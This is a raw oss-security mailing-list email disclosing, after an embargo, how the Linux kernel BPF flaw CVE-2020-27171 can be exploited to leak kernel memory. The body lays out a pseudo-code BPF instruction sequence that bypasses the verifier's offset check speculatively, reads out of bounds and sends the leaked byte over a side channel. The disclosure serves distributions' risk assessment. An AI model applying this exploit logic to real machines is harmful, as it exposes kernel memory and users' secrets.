X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1654" "Wednesday" "24" "March" "2021" "19:38:11" "+0000" "Piotr Krysiuk" "piotras@gmail.com" nil "40" "[oss-security] Re: [CVE-2020-27171] Numeric error when restricting speculative pointer arithmetic allows unprivileged local users to leak content of kernel memory" nil nil nil "3" nil nil (number mark "U       piotras@gmai Mar 24   40/1654  " thread-indent "\"[oss-security] Re: [CVE-2020-27171] Numeric error when restricting speculative pointer arithmetic allows unprivileged local users to leak content of kernel memory\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Re: [CVE-2020-27171] Numeric error when restricting speculative pointer arithmetic allows unprivileged local users to leak content of kernel memory" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 6087 invoked by uid 550); 24 Mar 2021 19:39:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1951 invoked from network); 24 Mar 2021 19:38:33 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=S8cj/U8Gc9mj7DltPk+Fj9KUj//eXeAqzxK9J8m6O1g=;
        b=ko02N7m8fDLw7MQmAhOnCbehEjsD37Idfm/mVbMu2rkYQhdykAtwgJ6avYxgVfHNSS
         Tzq3VlCboaCKME6Ry2aSinnqXdX7MdbUi0ZkYtIvSQBwYhXIWf4bK6OAGQ++lGoDTYG1
         l7vH0fC69qyfbo08gOMVP+CHkbxIB4tmuWtXbfZ61VrOQH0stUWf0ov0iimn8jrohEyZ
         qoHWiw43OcnVtC3qJjs51Gb01OJH5O03SB4iu+/i7G8r5aoVGhcFTmPa+BjAyAf5PuZn
         iZUYnXwkYxqEnQIzBtd407nRUTj0Qq8bOeJmb9E3jaV0UXSPmYQFUMkcj03ZpjsqCp2V
         8V1Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=S8cj/U8Gc9mj7DltPk+Fj9KUj//eXeAqzxK9J8m6O1g=;
        b=CUYY1v47BxAQQXMASQl4ORbF3tgallTxdWZU1Vlb9Zu2ZL9MzzW/qr5WP463Vxh2RS
         X/qrcThxrSnjbzbkwQYXNIklvNvh9pPHRdXjId8AjKRNaIdedyrUCrbCEgeb2x1fWPwz
         mN1zSEVjuhS+qnr7GMahQzJlW8+8vpao8eHRLthq2yAFHqDlSRiCBx9K0ZA26hSD/C2t
         zvU3cKDJit/TZoiqxqA0oWaOKD3iOr8wGXwC05aZfFHN6IA576qE2fH1kDdb3jTI6cbj
         yb4IqRq6FD+xjlXWOgVW5tLnEQr52AcdzxQx1INzr2arQoU3lW0Awxn7fQleXO4OSeRO
         byYA==
X-Gm-Message-State: AOAM530LjPNXzBPTGN/4eOrk8eYQEf81409iJJ0jp6fsq708OIAi04OH
	4KIjripP3M8pqDPwX82efEJ2iwxNJU2rtJNEzrCO3AM4USSDBA==
X-Google-Smtp-Source: ABdhPJzBAFKgRcxf5tv0zMxnQBYryhvgiq3FYllul9MPPp186AWwW6TQSgjZ7ItTYOpXdA61PsQEGmZFsBy4iIWZjFE=
X-Received: by 2002:a1c:df8a:: with SMTP id w132mr4448403wmg.53.1616614701770;
 Wed, 24 Mar 2021 12:38:21 -0700 (PDT)
MIME-Version: 1.0
References: <CAFzhf4qsDm74NJYA2toWYAVxUvvJyP7dD9sPC88EPkHpxf+cag@mail.gmail.com>
In-Reply-To: <CAFzhf4qsDm74NJYA2toWYAVxUvvJyP7dD9sPC88EPkHpxf+cag@mail.gmail.com>
From: Piotr Krysiuk <piotras@gmail.com>
Date: Wed, 24 Mar 2021 19:38:11 +0000
Message-ID: <CAFzhf4p-q+Lf35mfjUQwdV-yqYHQUW06BEs9rJG9OO4LL2YoNQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] Re: [CVE-2020-27171] Numeric error when restricting speculative
 pointer arithmetic allows unprivileged local users to leak content of kernel memory

Some details of how CVE-2020-27171 could be exploited in practice were
provided via linux-distros mailing list with 7 days embargo. This was
intended to help any affected Linux distributions to assess the risk
and decide about any appropriate actions.

As the embargo expires today, I was asked to share these details
publically on oss-security.

The CVE-2020-27171 vulnerability has been successfully reproduced
against Linux kernel v5.12-rc3 using the following logic for BPF
program attached to a socket:

    load pointer to our big array into BPF_REG_MAP_PTR,
    load offset of data to leak into BPF_REG_OFFSET,

    BPF_MOV64_REG(BPF_REG_OOB_ADDRESS, BPF_REG_MAP_PTR),

    // load any slowly-loaded value...
    BPF_LDX_MEM(BPF_DW, BPF_REG_SLOW_CHECK, BPF_REG_MAP_PTR, 0x1200),

    // ... and turn it into known zero for verifier,
    // while preserving slowly-loaded dependency for affected hardware
    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_CHECK, 1),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_CHECK, 2),

    // speculatively bypassed offset check
    BPF_JMP_REG(BPF_JNE, BPF_REG_OFFSET, BPF_REG_SLOW_CHECK,
                skip_speculation),

    // speculatively subtract masked BPF_REG_OFFSET from BPF_REG_OOB_ADDRESS,
    // where incorrect mask value 0xffffffff is used due to integer underflow
    BPF_ALU64_REG(BPF_SUB, BPF_REG_OOB_ADDRESS, BPF_REG_OFFSET),

    // speculatively out-of-bounds load
    BPF_LDX_MEM(BPF_B, BPF_REG_LEAKED_BYTE, BPF_REG_OOB_ADDRESS, 0),

    transmit speculatively loaded BPF_REG_LEAKED_BYTE via side-channel,

The full reproducers were shared with a number of Linux distributions
for protection purposes.
